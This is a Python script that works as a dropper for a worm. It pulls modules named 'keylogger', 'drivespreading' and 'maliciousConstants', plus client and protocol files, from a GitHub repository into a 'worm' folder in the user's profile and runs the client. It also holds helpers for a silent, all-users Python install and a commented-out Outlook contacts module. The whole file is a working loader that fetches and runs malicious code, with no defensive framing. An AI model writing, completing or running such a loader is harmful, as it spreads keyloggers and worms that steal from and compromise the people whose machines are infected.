
import sys
import subprocess

subprocess.run([sys.executable, "-m", "pip", "install", "os"], check=True)
subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=True)

import os
import requests


def download_python(version, download_path):
    url = f"https://www.python.org/ftp/python/{version}/python-{version}-amd64.exe"
    response = requests.get(url)

    with open(download_path, 'wb') as f:
        f.write(response.content)


def install_python(installer_path):
    subprocess.run([installer_path, '/quiet', 'InstallAllUsers=1', 'PrependPath=1'])


def get_project_files():
    """
        Download files from a GitHub repository.
        """
    owner = "EdanJacobson"
    repo = "ProjectCode"
    branch = "main"
    paths = {"malicious": ["drivespreading", "keylogger", "maliciousConstants"],
             "clnt": ["client", "constants", "methods", "protocol"]}
    # "outlook": ["contacts", "emailconstants"]}
    base_url = f'https://raw.githubusercontent.com/{owner}/{repo}/{branch}'
    for path in paths.keys():
        os.mkdir(f"C:/Users/{os.getlogin()}/worm/{path}")
        open(f"C:/Users/{os.getlogin()}/worm/{path}/__init__.py", "x")
        for file in paths.get(path):
            file_url = f"{base_url}/{path}/{file}.py"

            response = requests.get(file_url)

            if response.status_code == 200:
                content = response.content
                output_file = f"C:/Users/{os.getlogin()}/worm/{path}/{file}.py"
                sys.path.append(output_file)
                with open(output_file, 'wb') as f:
                    f.write(content)
            else:
                print(f"Failed to download file. Status code: {response.status_code}")


def main():
    get_project_files()
    path_to_client = os.path.join("C:/", "Users", os.getlogin(), "worm", "clnt", "client.py")
    subprocess.run([sys.executable, "-m", "pip", "install", "pipenv"], check=True)
    subprocess.run(['pipenv', 'run', 'python', "C:/Users/edanj/worm/clnt/client.py"], check=True)


if __name__ == '__main__':
    main()
